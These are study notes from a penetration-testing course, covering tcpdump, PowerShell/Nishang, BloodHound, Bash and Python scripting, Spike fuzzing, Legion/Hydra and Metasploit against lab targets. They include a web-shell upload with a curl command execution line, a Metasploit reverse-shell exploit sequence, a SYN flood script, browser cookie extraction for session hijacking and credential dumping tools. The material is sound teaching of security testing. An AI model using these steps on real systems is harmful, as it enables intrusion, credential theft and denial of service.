	• Tcpdump is a command-line packet capture tool for analyzing network traffic. It allows penetration testers and defenders to inspect, filter, and diagnose network communications in real time. It’s lightweight, flexible, and highly customizable through expressions and filters.

	• Key Concepts

		○ Setup \& Modes

			§ Promiscuous mode: Needed to capture packets not addressed to the host (enabled in VM settings).

			§ Run with root privileges (sudo) for packet capture.

			§ tcpdump -D → List available interfaces.

			§ -i any → Capture from all interfaces.

			§ -c <n> → Limit number of packets captured.

		○ Basic Options

			§ -n → Suppress hostname resolution.

			§ -nn → Suppress both hostname \& port name resolution (shows raw IP:port).

			§ -t → Human-readable timestamps.

			§ -x → Show packet in hex + ASCII.

			§ -v, -vv, -vvv → Verbosity levels.

			§ -s → Set packet size displayed (-s0 = full packet).

		○ Filtering Expressions

			§ Types:

				□ host/net/port → e.g., host 10.0.2.38, net 10.0.2.0/24.

			§ Direction:

				□ src, dst → Source/destination filters.

			§ Protocols:

				□ tcp, udp, icmp, ip6, etc.

			§ Examples:

				□ tcpdump -i eth0 -c 10 host 10.0.2.38 → Capture traffic to/from host.

				□ tcpdump udp → Only UDP traffic.

				□ tcpdump dst port 443 → Destination HTTPS traffic.

				□ tcpdump portrange 1-1023 → Common system ports.

		○ Advanced Use

			§ Write capture: -w file.pcap → Save in PCAP format for Wireshark.

			§ Logical operators: and, or, parentheses.

				□ Example: (src 10.0.2.38 and (dst port 80 or dst port 443)).

			§ Flag filtering:

				□ Example: tcp\[13] \& 2 != 0 → Capture SYN packets.

				□ Example: tcp\[tcpflags] \& tcp-syn != 0.

			§ Banner matching:

				□ Search for services (e.g., SSH) by looking for specific text strings in packets.

		○ Diagnostics \& Security Use Cases

			§ Identify what services are running (e.g., SSH headers).

			§ Detect suspicious or malformed traffic (e.g., invalid flag combos like RST+SYN).

			§ Trace communication patterns (who is talking to whom).

			§ Gather evidence of attacks or service exploitation attempts.



Work with netstat, nbtstat, and arp

	• Netstat, nbtstat, and arp are fundamental network diagnostic tools. They allow administrators and security testers to observe connections, ports, processes, routing, and address resolution mappings, which is critical for identifying anomalies and potential security issues without deep packet analysis.

	• Key Concepts

		○ Netstat (Network Statistics)

			§ Purpose: Displays active network connections and protocol statistics.

			§ Basic usage:

				□ netstat → Lists current TCP connections.

			§ Key columns:

				□ Protocol (TCP/UDP), Local address + port, Foreign address, Connection state.

			§ Useful switches:

				□ -b → Show the executable/program creating the connection.

				□ -o → Show the process ID owning the connection/port.

				□ -a → Show all services (TCP/UDP), both established and listening.

				□ -rn → Show routing table and interface info in numeric IP form.

			§ Insight: Helps identify suspicious or unexpected connections, open listening ports, and services that may be exposed.

		○ ARP (Address Resolution Protocol)

			§ Purpose: Maps IP addresses to MAC addresses (link-layer identifiers).

			§ Basic usage:

				□ arp -a → Display ARP table (all entries).

				□ arp -s <IP> <MAC> → Add a static ARP entry.

			§ Security concern:

				□ ARP tables can be modified maliciously for Man-in-the-Middle (MITM) attacks.

				□ Monitoring ARP entries helps detect anomalies like spoofed MAC addresses.

		○ Nbtstat

			§ Purpose: Used on Windows to diagnose NetBIOS over TCP/IP connections.

			§ Usage:

				□ nbtstat -n → List local NetBIOS names.

				□ nbtstat -A <IP> → Query remote machine for NetBIOS names.

			§ Value: Identifies file-sharing services, NetBIOS names, and possible vulnerabilities in older Windows networks.



Scripting with PowerShell

	• PowerShell is Microsoft’s powerful command-line shell and scripting environment, serving as the Windows equivalent of Bash on Linux. It combines command-line utilities, scripting, and access to Windows system management (WMI). It’s essential for both administrators (automation, system control) and penetration testers (system inspection and exploitation).

	• Key Concepts

		○ What PowerShell Is

			§ Built into all modern Windows systems.

			§ Mixes command-line tools, scripting language features, and Windows Management Instrumentation (WMI) access.

			§ Used for automation, system administration, and penetration testing.

		○ Cmdlets

			§ PowerShell introduces cmdlets (command-lets), small specialized commands.

			§ Verb-Noun syntax (standardized format):

				□ Examples: Get-Help, Get-Process, Set-Service.

			§ Get-Verb → Lists available verbs (~98 verbs).

			§ Consistent, discoverable naming makes it easier to learn and script.

		○ Help System

			§ help <command> → Provides usage information.

			§ Example: help push shows Push-Location cmdlet.

			§ Full docs show purpose, parameters, and related commands.

		○ Compatibility with Standard Commands

			§ Supports Windows shell commands (e.g., cd, dir, ipconfig)

			§ Also supports some Linux-style commands (cat, redirection operators <, >).

		○ Scripting Basics

			§ Scripts saved as .ps1 files.

			§ Run scripts with prefix: .\\script.ps1.

			§ PowerShell ISE (Integrated Scripting Environment) provides GUI assistance (syntax highlighting, autocomplete).

			§ Variables use $ prefix.

			§ Lists (arrays) supported, with .count property for length.

		○ Programming Constructs

			§ Output: echo or Write-Host.

			§ Conditionals: if-then statements, multi-line syntax.

			§ Loops:

				□ do { } while()

				□ ForEach → cleaner for list iteration.

			§ Variable substitution in strings: variables inside strings expand automatically.

		○ Practical Uses

			§ Automating Windows administration tasks.

			§ Interfacing with WMI for deep system data.

			§ Running executables and scripts directly.

			§ Useful for penetration testers to query system state, processes, services, and exploit automation.



Extending PowerShell with Nishang

	• Nishang is a collection of offensive PowerShell scripts (cmdlets) created by Nikhil Mittal, widely used for penetration testing and red team operations. It extends PowerShell’s native capabilities, adding tools for information gathering, credential dumping, lateral movement, brute force, payload generation, and malware detection.

	• Key Concepts

		○ What Nishang Is

			§ A PowerShell exploitation framework.

			§ Available by default in Kali Linux, but can also be installed on Windows.

			§ Downloadable from GitHub (requires manual extraction).

			§ Must be run as Administrator, with antivirus protection often disabled (many scripts are flagged as malicious).

		○ Setup \& Loading

			§ Execution policy: Unsigned scripts need to be allowed.

			§ Unblocking scripts: Use Get-ChildItem (gci) to recursively unblock contents.

			§ Importing adds many new Nishang cmdlets into PowerShell.

		○ Core Capabilities

			§ Information Gathering

				□ Collects system data: users, hosts, installed software, drivers, interfaces, etc.

			§ Credential \& Hash Extraction

				□ Invoke-Mimikatz → Extracts credentials from memory.

				□ Get-PassHashes → Extracts password hashes.

			§ Port Scanning

				□ Identifies open ports for lateral movement.

			§ Payload Generation (Weaponization)

				□ Out-Word → Embeds payloads into Word documents.

				□ Other payload formats: Excel (Out-XL), Shortcuts (Out-Shortcut), Compiled HTML Help (Out-CHM), JavaScript (Out-JS).

			§ Brute Force Attacks

				□ Invoke-BruteForce → Runs dictionary attacks against services (e.g., FTP).

				□ Supports verbose mode and stopping on success.

			§ Malware Detection via VirusTotal

				□ Invoke-Prasadhak → Uploads process executables’ hashes to VirusTotal (requires API key).

				□ Helps verify whether running processes are malicious.

		○ Security \& Testing Implications

			§ For penetration testers: Extends PowerShell into a post-exploitation toolkit, enabling realistic adversary simulations.

			§ For defenders: Highlights how attackers may abuse PowerShell and Nishang for lateral movement and persistence.

			§ Detection: Many commands overlap with known attacker TTPs (aligned with MITRE ATT\&CK).



What is Active Directory?

	• Active Directory (AD) is Microsoft’s LDAP-compliant identity and domain management system, central to most enterprise networks. It manages identities, access, policies, and trust relationships across complex organizational structures. Understanding AD is crucial for both administrators and penetration testers because it is a common target in attack chains.

	• Key Concepts

		○ Active Directory Domain Services (AD DS) is the full name.

		○ Provides much more than an LDAP directory:

			§ Identities (users, groups, services).

			§ Domain management (policies, security, replication).

			§ Centralized authentication and authorization.

		○ Core Components

			§ AD Objects: Users, computers, groups, policies, etc.

			§ Schema: Defines AD objects and their attributes.

			§ Catalog: Hierarchical structure (containers for browsing/searching objects).

			§ Group Policy Objects (GPOs): Centralized configuration for users/computers.

			§ Replication Service: Synchronizes data across domain controllers.

			§ Security system: Controls authentication and access within domains.

		○ Hierarchical Structure

			§ Realm: The full enterprise scope.

			§ Forests: Independent groups of domains (each a security boundary).

				□ One org = one forest, or multiple for conglomerates/business units.

			§ Domains: Logical groupings of AD objects (users, machines, etc.).

			§ Subdomains: Nested hierarchies (domain → subdomain → sub-subdomain).

			§ Sites: Sub-hierarchy reflecting physical network topology.

				□ Important for replication and group policy application.

				□ Policies apply in order: domain → site → local machine.

		○ Trust Relationships

			§ Required for replication between domains.

			§ Enable cross-domain access (users in one domain querying another).

			§ Critical for enterprise-wide authentication and collaboration.

		○ Practical Relevance

			§ AD structures often mirror real-world business organization (domains, subdomains, forests).

			§ Tools like DMitry can reveal public subdomains (e.g., yahoo.com → ca.yahoo.com, uk.yahoo.com).

			§ AD is a frequent attack target, since compromising domain controllers can yield enterprise-wide access.

			§ Essential knowledge for penetration testers and defenders.



Analyzer Active Directory with BloodHound

	• Bloodhound is a tool used in penetration testing to map out relationships and privilege paths in Active Directory (AD) environments. It helps testers (and attackers) identify how a standard domain user could escalate privileges to become a domain administrator by analyzing AD objects and permissions.

	• Key Concepts

		○ Purpose of BloodHound

			§ Identifies privilege escalation paths in AD.

			§ Maps users, groups, permissions, and trust relationships.

			§ Useful for penetration testers to plan escalation from low-privileged accounts to high-value targets (e.g., domain admins).

		○ How BloodHound Works

			§ Data Collection:

				□ Requires a domain user account to query AD.

				□ Uses BloodHound-python (or other collectors) to gather data.

				□ Collector outputs JSON files with AD structure.

			§ Data Analysis:

				□ Data imported into BloodHound, which uses a Neo4j graph database.

				□ Relationships between users, groups, and permissions are visualized.

				□ Analysts can run queries and built-in analytics to find escalation opportunities.

		○ BloodHound Setup

			§ Obtain domain user credentials (in example: jdoe76 / JDPass2021).

			§ Run bloodhound-python with domain, username, password, and name server to extract AD data.

			§ Start Neo4j (graph database backend).

			§ Load JSON data into BloodHound GUI.

		○ Analysis Examples

			§ Path Finding:

				□ Can search for paths from a given user to Domain Admins@<domain>.

				□ Example: user AKATT42 → found to be a member of Domain Admins.

			§ Built-in Analytics:

				□ List all Domain Admins → identifies accounts with highest privileges.

				□ List all Kerberoastable Accounts → service accounts vulnerable to Kerberos ticket extraction.

				□ Find AS-REP Roastable Users → accounts without Kerberos pre-authentication (easily brute-forced)

			§ These help uncover stepping stones toward escalation.

		○ Why It Matters

			§ BloodHound is especially effective in large, complex AD environments where manual privilege mapping is impractical.

			§ It provides defenders and testers with visibility of privilege pathways attackers could exploit.

			§ Helps prioritize which accounts to protect (e.g., vulnerable service accounts, non-preauth accounts, or domain admins).



#### Bash Scripting





Refreshing Your Bash Skills

	• Bash is a core Linux shell and scripting language. It allows automation of tasks, command execution, and user interaction through scripts (.sh files). For penetration testers (and system administrators), refreshing Bash scripting skills is important for building quick utilities, automating tests, and handling command-line workflows.

	• Key Concepts

		○ Bash Basics

			§ Shell scripts are text files with a .sh extension.

			§ First line typically declares the interpreter (shebang: #!/bin/bash).

			§ Scripts must be made executable with chmod +x filename.sh.

			§ Execution: ./filename.sh.

		○ Hello World Example

			§ Classic example script (hello.sh) assigns a string variable and prints it.

			§ Demonstrates how Bash executes commands in sequence.

		○ Command-Line Arguments

			§ $1, $2, etc. → Positional parameters for arguments passed to the script.

			§ Example (argue.sh): two arguments combined to print "Hello World".

			§ Useful for writing scripts that adapt based on user input.

		○ Variables and Arithmetic

			§ Variables are untyped in Bash.

			§ Arithmetic operations use double bracket syntax (( )).

			§ Example (variables.sh):

				• Takes input from command-line.

				• Compares values with constants.

				• Performs numeric addition.

		○ Reading User Input

			§ read command → captures input from the terminal.

			§ Can prompt with echo, or inline prompt (read -p).

			§ Example (reader.sh): reads a name and prints a message using it.

			§ Demonstrates interactive scripting.



Controlling the Flow in a Script

	• Bash provides flow control statements (loops and conditionals) that allow scripts to make decisions and repeat tasks. These constructs make Bash scripting more powerful, flexible, and capable of handling real-world automation and penetration testing workflows.

	• Key Concepts

		○ For Loops

			§ Example (fortest.sh):

				• Uses array length (^ or ${#array\[@]}) to determine loop range.

				• First array element index = 0.

				• Syntax: ${i} used as the array index inside the loop.

			§ Prints out list of array elements sequentially.

		○ While Loops

			§ Executes code repeatedly while a condition is true.

			§ Example (wutest.sh):

				• Starts index at 6.

				• Decrements index until it is no longer greater than 0.

			§ Demonstrates countdown behavior.

		○ Until Loops

			§ Opposite of while. Runs until a condition becomes true.

			§ Example:

				• Starts index at 1

				• Increments until index is greater than 6.

			§ Demonstrates counting upward.

		○ If-Else Statements

			§ Enable conditional execution based on tests.

			§ Example (iftest.sh):

				• Uses -d operator to check if a directory exists.

				• If it exists → print confirmation + list contents.

				• If not → display “doesn’t exist” message.

			§ Example results:

				• iftest.sh barney → directory missing.

				• iftest.sh /usr/share/Thunar → directory exists, contents listed.



Using Functions in Bash

	• Bash allows the creation and use of functions within scripts, making them more modular, reusable, and easier to maintain. Functions can also be combined with control structures like case statements and select menus to build interactive, flexible scripts.

	• Key Concepts

		○ Functions in Bash

			§ Defined with a function name followed by {} enclosing commands.

			§ Can accept parameters (e.g., $1 for the first argument).

			§ Promote code reuse and better script structure.

			§ Example: A function that takes a city name and outputs language advice.

		○ Operators in Bash

			§ String comparisons/assignments: Single equals sign =.

			§ Numeric comparisons: Double equals ==.

			§ Knowing the difference prevents logic errors in scripts.

		○ Select Statement

			§ Provides a menu-driven interface in Bash.

			§ Automatically loops until a break condition is met.

			§ Works with the PS3 variable (prompt string), e.g., PS3=">"

		○ Case Statement

			§ Used to handle different menu selections or conditions.

			§ Cleaner and more readable than nested if statements.

			§ Works well with select for handling menu-driven choices.

		○ Practical Example

			§ Script (fntest.sh) combines:

				□ A function (speak) → checks a city and outputs the language spoken.

				□ A select menu → lets the user choose a city.

				□ A case statement → maps city to country.

				□ A function call → outputs language info after the country is printed.

			§ Demo outputs:

				□ Choosing Melbourne → “Australia, Language: English.”

				□ Choosing Paris → “France, Language: French.”

				□ Choosing Hanoi → “Vietnam, Language: Vietnamese + French/English.”

				□ Choosing Asmara → “Eritrea, try English (louder).”



#### Python Scripting



Refresh your Python Skills

	• Python is an interpreted, cross-platform programming language widely used for automation, penetration testing, and scripting. This refresher highlights its core syntax, data structures, and flow control mechanisms that are especially useful for pen testers and system administrators.

	• Key Concepts

		○ Python Basics

			§ Interpreted language: Runs line by line in an interpreter (e.g., python in terminal).

			§ Available for Windows and Linux (pre-installed on most Linux distros like Kali).

			§ Scripts are plain text files (e.g., hello.py) run with python script.py.

			§ Different versions exist (e.g., Python 2 vs Python 3), so compatibility matters when reusing scripts.

		○ Data Types \& Variables

			§ Python is dynamically typed: variable type is set by assignment.

			§ Common types:

				□ Integer (8080)

				□ Float (12.43)

				□ Boolean (True/False)

				□ String ("Malcolm")

			§ Type can be checked with type(variable).

			§ Supports normal operators (math, string concatenation).

		○ Collections

			§ Lists (\[ ]): Ordered sequences, indexed starting at 0.

				□ Example: activehost = \[], then .append("10.0.2.8").

				□ Access elements with \[index].

			§ Dictionaries ({ }): Key-value pairs.

				□ Example: hostname = {"173.23.1.1": "munless.com.ch"}.

				□ Keys map to values, can be updated with .update().

				□ Looping: for key in hostname: print(key, hostname\[key]).

		○ Conditionals

			§ If/Else statements: Used for logic.

				□ Example:

					numb = 5

					if numb < 10:

					    print("Single digit value")

				□ Indentation is critical—Python uses whitespace to define scope.

		○ Loops

			§ For loops: Iterates over ranges or sequences.

				□ Example: for x in range(1,5): print("Repetition " + str(x)) → runs 1 to 4.

			§ While loops: Repeat until condition fails (not deeply covered in transcript here).

		○ String Functions

			§ Built-in string manipulation:

				□ .upper() → uppercase.

				□ .lower() → lowercase.

				□ .replace(old,new) → replace substrings.

				□ .find(substring) → find position of substring.

			§ Demonstrates Python’s extensive standard library functions.

		○ Practical Relevance for Pen Testing

			§ Network programming (e.g., sockets, requests) is heavily used.

			§ Lists/dictionaries are ideal for managing hosts, credentials, and services.

			§ Conditionals and loops automate repetitive testing tasks.

			§ Strong library support makes Python flexible for security scripting.



Use the System Functions

	• Python can be extended with system and third-party libraries, which allow scripts to interact with the operating system and external commands. Two important libraries for penetration testers and system administrators are os (built-in system calls) and subprocess (running external commands).

	• Key Concepts

		○ OS Library

			§ Purpose: Provides access to operating system–level information and functions.

			§ Example:

				import os

				os.uname()

			§ Returns details about the OS (name, version, release, etc.).

			§ Useful for gathering environment/system details within scripts.

		○ Subprocess Library

			§ Purpose: Runs external system commands directly from Python.

			§ Example Script (sprog.py):

				import subprocess

				

				# Run uname -V and display results

				subprocess.run(\["uname", "-V"])

				

				# Run uname -ORS, capture result, and decode output

				result = subprocess.run(\["uname", "-oRS"], capture\_output=True)

				print(result.stdout.decode())

			§ Allows both execution (displaying results directly) and capturing output for later processing.

			§ Common in penetration testing for automating system enumeration or integrating system tools into larger scripts.

		○ Why These Libraries Matter

			§ They extend Python beyond its core language, bridging into the OS environment.

			§ Enable automation of system tasks like:

				□ Gathering OS metadata.

				□ Running and chaining command-line tools.

				□ Capturing output for analysis.

			§ Reduce the need for reinventing solutions—many tasks can be done by wrapping existing system utilities.

				



Use Networking Functions

	• Python’s socket module provides low-level networking capabilities, allowing penetration testers to write custom tools for banner grabbing, port scanning, and host reconnaissance. While tools like Nmap already exist, building simple scanners in Python helps understand how network communication works and gives flexibility in testing.

	• Key Concepts

		○ The Socket Module

			§ Importing: import socket to access networking functions.

			§ Configuration:

				□ Set defaults like timeout (socket.setdefaulttimeout(1)).

			§ Creating a socket: socket.socket(socket.AF\_INET, socket.SOCK\_STREAM) for TCP.

			§ Basic use case: Connect to a host/port and receive data.

		○ Banner Grabbing (banftp.py)

			§ Connects to a specific service (FTP on port 21).

			§ Example steps:

				□ Import socket.

				□ Set timeout to 1 second.

				□ Connect to 10.0.2.32:21.

				□ Receive up to 1024 bytes (recv(1024)).

				□ Decode and print the banner.

			§ Purpose: Quickly identify services and versions running on a host.

		○ Simple Port Scanner (portscan.py)

			§ Goal: Identify open TCP ports on a host.

			§ Implementation:

				□ Takes IP address as a command-line argument (sys.argv).

				□ Loops through port range 1–1023.

				□ Tries to connect to each port inside a try/except block.

				□ If connection succeeds → prints port as open.

			§ Demonstrates how scanners work under the hood.

			§ Example run: python portscan.py 10.0.2.32.

		○ Why Build Custom Tools?

			§ Learning value: Understand sockets, connections, and service banners.

			§ Flexibility: Customize for unusual cases (e.g., proprietary services).

			§ Simplicity: Useful for quick checks without large tools like Nmap.

			§ Stealth: Custom scripts may bypass defenses tuned to detect standard tools.



Work with Websites

	• Website penetration testing often requires manual interaction beyond automated tools. Python provides libraries to interact with websites, FTP servers, and file uploads, which can be leveraged to detect vulnerabilities and even execute attacks such as remote code execution (RCE).

	• Key Concepts

		○ Retrieving Web Pages

			§ Library used: urllib.

			§ Example script (useurl.py):

				• Send request to open a webpage (index page).

				• Decode and print HTML.

			§ Purpose: Gain direct access to raw page code for analysis.

		○ Interacting with FTP Servers

			§ Library used: ftplib.

			§ Example script (useftp.py):

				• Connect to FTP server with credentials.

				• Change directory to /var/www (web root).

				• List directory contents with .dir().

			§ Observation: Found a DAV webpage with world-write permissions, which signals a potential vulnerability.

		○ Exploiting Writable Web Directories

			§ Attack method: Uploading a malicious PHP web shell.

			§ Example:

				• PHP file (Shelly.php) → executes commands from URL.

				• Python script (webinject.py) → logs in via FTP, switches to vulnerable folder, and uploads Shelly.php using storbinary.

			§ Outcome: Attacker has a backdoor on the webserver.

	• Command Execution via Web Shell

		○ Once uploaded, the PHP shell can be triggered via a browser or curl.

		○ Example with curl:

			curl http://10.0.2.32/DAV/Shelly.php?cmd=ls%20/home%20-l

			§ %20 = URL-encoded space.

			§ Executes ls -l /home remotely and returns results.

		○ Why This Matters

			§ Demonstrates common real-world attack chain:

				• Reconnaissance → Identify web/FTP server.

				• Enumeration → Detect misconfigurations (writable web folders).

				• Exploitation → Upload malicious file.

				• Post-exploitation → Achieve remote code execution.

			§ Highlights importance of file permissions, FTP security, and input sanitization in web environments.



Access SQLite Databases

	• SQLite databases are commonly encountered during penetration testing (e.g., browser storage, mobile apps). Python’s sqlite3 library provides a simple way to automate interaction with SQLite databases for enumeration and data extraction.

	• Key Concepts

		○ Where SQLite Appears

			§ Found in many applications (browsers, mobile devices, local apps).

			§ Example: Google Chrome uses an SQLite database called Cookies to store session cookies.

			§ Pen testers often target these databases to extract sensitive data (sessions, tokens, credentials).

		○ Connecting to SQLite with Python

			§ Library: sqlite3 (built-in to Python).

			§ Steps:

				□ Import sqlite3.

				□ Connect to the database file (e.g., cookies).

				□ Create a cursor and execute SQL queries.

				□ Fetch and display results.

		○ Database Exploration

			§ Step 1 – List Tables (squeal1.py):

				□ Run query against SQLite master config:

				SELECT name FROM sqlite\_master WHERE type='table';

				□ Revealed tables: meta and cookies.

			§ Step 2 – List Columns (squeal2.py):

				□ Select all fields from cookies table to get column metadata.

				□ Identified the structure of stored cookie data.

			§ Step 3 – Extract Data (squeal3.py):

				□ Query specific fields (e.g., host/site name and cookie value).

				□ Print formatted output for readability.

				□ Produces a list of cookies stored by the browser.

		○ Why This Matters for Pentesting

			§ Cookies can contain session tokens, authentication info, and persistent logins.

			§ Extracting them may allow:

				□ Session hijacking (reuse of session IDs).

				□ Bypassing authentication if tokens are still valid.

			§ SQLite analysis provides insight into how applications store sensitive data locally.



Using Scapy to work with packets

	• Scapy is a powerful Python library for crafting and sending raw network packets. It allows penetration testers to build packets at any layer, customize their fields, and send them directly to a target—making it useful for testing, probing, and simulating attacks such as SYN floods.

	• Key Concepts

		○ What Scapy Is

			§ A Python-based packet manipulation tool.

			§ Can be used interactively (as a CLI) or imported as a library inside scripts.

			§ Provides control over network layers (Ethernet, IP, TCP, UDP, ICMP, etc.).

			§ Let's testers create, modify, send, and sniff packets.

		○ Creating Packets

			§ With Scapy, you can:

				□ Define each layer of a packet (e.g., IP, TCP).

				□ Set fields manually (source/destination IP, ports, flags).

			§ Example in transcript: building TCP SYN packets with defined source/destination IPs and ports.

		○ Example: SYN Flood Script (spack.py)

			§ Routine:

				□ Loops across a range of ports on the target.

				□ Creates TCP packets with the SYN flag set.

				□ Sends them rapidly to overwhelm the target.

			§ Demonstrates DoS principles (though a simple, not optimized, flood).

			§ Execution: sudo python spack.py (requires privileges to send raw packets).

		○ Why Scapy Matters

			§ Useful for penetration testers to:

				□ Simulate attacks (e.g., floods, scans).

				□ Probe systems in custom ways (not just default Nmap-style scans).

				□ Test how a target responds to crafted/malformed packets.

			§ Provides deep flexibility compared to pre-built tools.



Leveraging OpenAI for testing

	• AI tools like OpenAI can be integrated into penetration testing workflows to assist with automation, code generation, and intelligence gathering. By programmatically accessing the OpenAI API, testers can dynamically generate scripts, queries, and security insights that complement traditional tools.

	• Key Concepts

		○ Setting Up OpenAI

			§ Requires an OpenAI account and an API key (free to obtain).

			§ Install Python library:

				sudo pip3 install openai

			§ In scripts, import both openai and os libraries.

			§ Authenticate with your API key before making requests.

		○ Writing a Python Script (myai.py)

			§ Steps in the example script:

				□ Import libraries.

				□ Initialize OpenAI with the API key.

				□ Prompt user for input (e.g., a question or task).

				□ Configure query for GPT model (e.g., GPT-3.5 Turbo).

				□ Specify context/role (e.g., “university lecturer”).

				□ Send query and print the AI’s response.

		○ Practical Testing Examples

			§ Code generation:

				□ Asked for a Python port scanner → OpenAI produced script.

				□ Asked for a PowerShell script to enumerate SMB services → OpenAI provided one.

			§ Threat intelligence:

				□ Queried information on APT28 (Fancy Bear/Sofacy).

				□ Received background, aliases, and activity details.

		○ Why This Matters for Pen Testing

			§ Accelerates scripting: Quickly generate working code for common tasks.

			§ Broad coverage: Handles multiple languages (Python, PowerShell, etc.).

			§ Threat research: Can provide summaries of adversaries, mapped to MITRE ATT\&CK.

			§ Flexibility: Answers depend on the specificity of the query—better prompts yield better results.



#### Kali and Metasploit



A Kali Refresher

	• Kali Linux is a specialized penetration testing distribution. Before using it for security testing, testers should refresh themselves on basic configuration, updates, and built-in tools like macchanger and searchsploit. These ensure the environment is prepared, anonymized when needed, and equipped for vulnerability research.

	• Key Concepts

		○ System Configuration in Kali

			§ Settings management:

				□ Adjust power, display, and security settings (e.g., prevent suspend, lock screen on sleep).

			§ Updating \& upgrading:

				□ Always run:

					sudo apt update \&\& sudo apt upgrade

				□ Ensures all tools and system packages are current.

		○ MAC Address Management

			§ MAC address: The unique hardware address of the network card.

			§ Can be spoofed/changed for anonymity during testing.

			§ Tool: macchanger (found under Sniffing \& Spoofing).

			§ Usage example:

				sudo macchanger -A eth0

				□ Randomizes MAC address for the eth0 interface.

			§ Verify changes with ifconfig.

		○ Vulnerability Research with SearchSploit

			§ Tool: searchsploit (under Exploitation Tools).

			§ Connects to Exploit-DB, a database of public exploits.

			§ Basic usage:

				searchsploit smb

				□ Lists vulnerabilities related to SMB protocol.

			§ Can narrow results by adding keywords:

				searchsploit smb windows

			§ Limits output to Microsoft SMB vulnerabilities.

		○ Kali Menus \& Tools

			§ Kali provides categorical menus (e.g., Sniffing \& Spoofing, Exploitation Tools).

			§ Each contains pre-installed tools commonly used in penetration testing.

			§ Familiarity with these menus improves speed and efficiency during engagements.



Fuzzing with Spike

	• Fuzzing is a penetration testing technique where large amounts of unexpected or malformed data are sent to a target to test for vulnerabilities. The tool Spike, included in Kali Linux, can automate fuzzing against network services. This demo uses Spike against the intentionally vulnerable Vulnserver application to trigger crashes.

	• Key Concepts

		○ Vulnserver Setup

			§ Target system: Windows host running Vulnserver.

			§ Port: Listens on 9999.

			§ Verified connection with Netcat (nc 10.0.2.14 9999).

			§ The HELP command shows available commands, including TRUN, which is used for fuzzing.

		○ Spike Action File

			§ Spike uses action files (.spk) to define fuzzing input.

			§ Example (command.spk):

				□ Reads the banner from the server.

				□ Sends TRUN followed by a variable fuzz string.

			§ Syntax:

				s\_string("TRUN ")

				s\_string\_variable("COMMAND")

		○ Running the Fuzzing Test

			§ Command used:

				generic\_send\_tcp 10.0.2.14 9999 command.spk 0 0

			§ Observations:

				□ Initial traffic works (handshake + welcome banner).

				□ After repeated fuzzed TRUN packets, server stops responding (crash).

		○ Analyzing the Crash

			§ Wireshark captures confirm the sequence:

				□ Normal three-way handshake (SYN → SYN/ACK → ACK).

				□ Welcome messages (105-byte packets).

				□ Fuzzed TRUN packets sent repeatedly.

				□ Eventually no response → server crash.

			§ Next step would be to identify the exact fuzz string that caused the crash, which could form the basis for an exploit (e.g., buffer overflow).

		○ Why This Matters

			§ Fuzzing is a powerful technique to find vulnerabilities in services and applications.

			§ Spike provides a simple but effective way to automate malformed input tests.

			§ Identifying crashes is the first stage in exploit development (e.g., turning a crash into code execution).

			§ Vulnserver + Spike is a safe lab environment for learning fuzzing without risking real systems.



Information Gathering with Legion

	• Legion is a penetration testing tool in Kali Linux used for service enumeration, vulnerability analysis, and credential discovery. It automates reconnaissance by scanning hosts, identifying services, and integrating brute force testing (via Hydra) to uncover valid credentials.

	• Key Concepts

		○ Starting Legion

			§ Found in Applications → Vulnerability Analysis in Kali.

			§ Requires root access (default password: kali).

			§ GUI-based tool (maximize the window for easier navigation).

		○ Adding a Target Host

			§ Hosts are added manually to be scanned.

			§ Example: 10.0.2.8 (Metasploitable server).

			§ Selecting “hard assessment” launches a detailed scan.

			§ Progress is shown in the bottom panel, with results appearing in the main panel.

		○ Service Discovery

			§ Legion enumerates open ports and running services.

			§ Example results:

				□ MySQL (Port 3306) → Detected version 5.0.51a.

				□ FTP (Port 21) → Service identified.

				□ Bind shell (Port 1524) → Detected as Metasploitable root shell.

				□ Some ports may be denied (e.g., Port 6000).

		○ Credential Discovery with Hydra Integration

			§ Legion integrates with Hydra to automatically attempt logins.

				□ Example:

					® MySQL service → Hydra found valid login credentials.

					® FTP service → Hydra also retrieved valid credentials.

				□ Shows how Legion goes beyond simple enumeration to provide direct access paths.

		○ Brute Force Testing

			§ The Brute tab allows custom dictionary-based attacks.

			§ Example setup:

				□ Target: 10.0.2.8 on Port 22 (SSH).

				□ Usernames: unix\_users.txt.

				□ Passwords: unix\_passwords.txt.

				□ Hydra runs against the service using the supplied lists.



Using Metasploit

	• Metasploit is a powerful exploitation framework that allows penetration testers to demonstrate whether vulnerabilities are actually exploitable. It provides a large collection of exploits, payloads, and auxiliary modules, enabling both reconnaissance and post-exploitation activities. This transcript walks through using Metasploit to exploit a service on a target system and establish a remote shell.

	• Key Concepts

		○ Metasploit Overview

			§ Found in Kali → Applications → Exploitation Tools.

			§ On first startup, initializes its database.

			§ Provides:

				□ 2000+ exploits

				□ 1000+ auxiliary modules

				□ 363 post-exploitation tools

				□ 592 payloads

			§ Components:

				□ Exploits → Code used to take advantage of vulnerabilities.

				□ Auxiliary modules → Information gathering, scanning, brute force, etc.

				□ Payloads → Code executed on the target after exploitation (e.g., reverse shell).

				□ Post-exploitation tools → Actions taken after a compromise (e.g., persistence, privilege escalation).

		○ Basic Commands

			§ help → Lists all Metasploit commands.

			§ show exploits → Displays available exploits.

			§ search <term> → Filters results by keyword (e.g., search win8, search irc).

			§ use <exploit> → Loads a selected exploit.

			§ show targets → Lists supported target types.

			§ show payloads → Displays compatible payloads.

			§ info <payload> → Provides detailed information.

			§ set <option> → Configures exploit/payload parameters (e.g., set RHOSTS).

			§ show options → Shows required parameters.

			§ exploit → Executes the attack.

		○ Exploit Demonstration (Metasploitable Server)

			§ Target Service: IRC (UnrealIRCd backdoor).

			§ Exploit used:

				exploit/unix/irc/unreal\_ircd\_3281\_backdoor

			§ Payload selected:

				cmd/unix/reverse

				□ Creates a reverse shell on port 4444.

				□ Does not require admin privileges.

			§ Steps executed:

				□ use exploit/unix/irc/unreal\_ircd\_3281\_backdoor

				□ set target 0 (automatic detection)

				□ show payloads → choose reverse shell

				□ set payload cmd/unix/reverse

				□ set RHOSTS 10.0.2.8 (target IP)

				□ set LHOST 10.0.2.18 (attacker’s Kali IP)

				□ exploit

			§ Result:

				□ Exploit succeeded.

				□ Reverse shell established on remote system.

				□ Verified remote access by:

					® Running ifconfig (saw remote IP 10.0.2.8).

					® Running whoami (root access confirmed).

					® Running ps (list processes).

					® Running ls (list files).

		○ Why Metasploit is Important

			§ Evidence of exploitation: Goes beyond theoretical vulnerabilities to actual proof of compromise.

			§ Rapid exploitation: Provides pre-built, tested modules.

			§ Flexibility: Exploits, payloads, auxiliary modules, and post-exploitation tools can be combined.

			§ Education \& training: Ideal for learning exploitation techniques in labs (e.g., Metasploitable).



